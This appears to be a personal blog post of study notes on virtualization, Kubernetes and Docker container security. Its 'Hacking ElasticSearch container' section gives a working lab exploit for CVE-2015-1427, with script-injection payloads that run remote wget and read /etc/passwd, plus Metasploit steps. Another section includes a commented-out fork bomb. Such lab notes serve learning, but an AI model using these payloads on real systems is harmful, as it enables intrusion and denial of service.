---
layout: post
title: "Virtualization"
categories: virtualization
tags: virtualization K8 K8s kubernete kube VDI
---

* TOC
{:toc}

Virtual Desktop Infrastructure

Citrix



BusyBox

Vagrant
An open-source tool for controlling virtual machines



## Containerization

"**Kubernetes** orchestrates, schedules and manages the life of **containers**, running in **Docker** and other Container Runtimes"

Containers allow a virtual machine to be sliced up into isolated filesystem regions. A container can be as large as the entire VM or as small as your smallest service, hence the term microservices.

Microservices run in containers, which run on a virtual machine which runs on a hypervisor which runs on a server which sits in a rack which sits in a data center which is part of a network of data centers called the cloud.



### Kubernetes

<img src="https://github.com/sif/sif/raw/main/files/post_files/container_evolution.png" />

<img src="https://github.com/sif/sif/raw/main/files/post_files/kube.jpeg" />

container orchestration tool

Kubernetes run across a cluster while Docker runs on a single node

Kubernetes is more extensive than Docker Swarm and is meant to coordinate clusters of nodes at scale in production in an efficient manner

to see a list of pods
`kubectl get pods`

to delete a pod
`kubectl delete pod "podname"`

CNI (Container Network Interface)

PSP (Pod Security Policy) vs PSA (Pod Security Admission)
stick with PSA, much easier otherwise use a third-party solution



#### Resiliency

Autoscaling

Chaos Engineering

Container Lifecycle Hooks

Load Balancing

Node Selectors and Pod Affinity

Pod Disruptions

Pod Health Probes



### Docker

dockerfile
image
container

"In order to use Kubernetes, you will need to have Docker installed, because Kubernetes uses Docker to run containers. Therefore, you will need to install Docker before you can set up Kubernetes. Once you have Docker installed, you can use the kubeadm tool to set up a Kubernetes cluster."



#### Hacking ElasticSearch container

Gaining access to a container via application exploits

CVE-2015-1427

Elasticsearch 1.4.2

1. Launch the container: `docker run -d -p 9200:9200 --name es benhall/elasticsearch:1.4.2`
2. Insert toy data via cURL: `curl -XPUT 'http://host01:9200/twitter/user/kimchy1' -d '{ "name" : "Shay Banon" }'`
3. Exploit: `curl http://host01:9200/_search?pretty -XPOST -d '{"script_fields": {"myscript": {"script":"java.lang.Math.class.forName(\"java.lang.System\").getProperty(\"os.name\")"}}}'`
4. `curl http://host01:9200/_search?pretty -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"wget -O /tmp/testy http://httpbin.org/get\")"}}}'`
5. `curl http://host01:9200/_search?pretty -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /tmp/testy\").getText()"}}}'`
6. `curl http://host01:9200/_search?pretty -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getText()"}}}'`
7. Metasploit: `docker run -it --link es:es --entrypoint bash benhall/metasploit`
8. `chmod +x start.sh && ./start.sh`
9. use exploit/multi/elasticsearch/search_groovy_script
10. ```
set TARGET 0
set RHOST es
exploit
```
11. After running exploit, you should have access

"Container Security
By default Docker drops certain Linux capabilities and blocks syscalls to add a default level of security. As a result, the harder is isolated and the host protect from certain attack angles a hacker might use."

#### cgroups, Namespaces

cgroups control how much resources a process can use

docker run -d --name mb100 --memory 100m alpine top

docker stats --no-stream

docker run -d --name c768 --cpuset-cpus 0 --cpu-shares 768 benhall/stress

docker run -d --name c256 --cpuset-cpus 0 --cpu-shares 256 benhall/stress

sleep 5

docker stats --no-stream

docker rm -f c768 c256

Namespaces control what a process and see and access

Network Namespace

Pid Namespace

Sharing Namespaces

#### Fork Bombing and Resource Limits

set -x; #:(){ :|: & };:
Remove the # to run it

"1. defines a function called : with :()
2. recursively calls itself with the second :
3. pipes its output to another instance of itself | :
4. forks the recursive and piped instances of itself to a subshell &
5. finishes the function declaration }
6. uses a command separator to put more than one instruction on a single line (;)"

ulimit, soft and hard limit

docker run -it --ulimit nofile=12:12 debian bash -c "ulimit -n"

docker run -it --ulimit nofile=12:12 debian bash

nproc

#### Securing Host

Docker Bench



#### User Namespaces



#### Kernel Capabilities



#### Seccomp



#### Use No New Privileges flag to restrict additional access

restrict applications with correct flags from gaining root access



#### Apparmor



#### Generate AppArmor profiles using Bane



#### Images and Scanning

scan images for vulnerabilities before running them



### Cloud Foundry


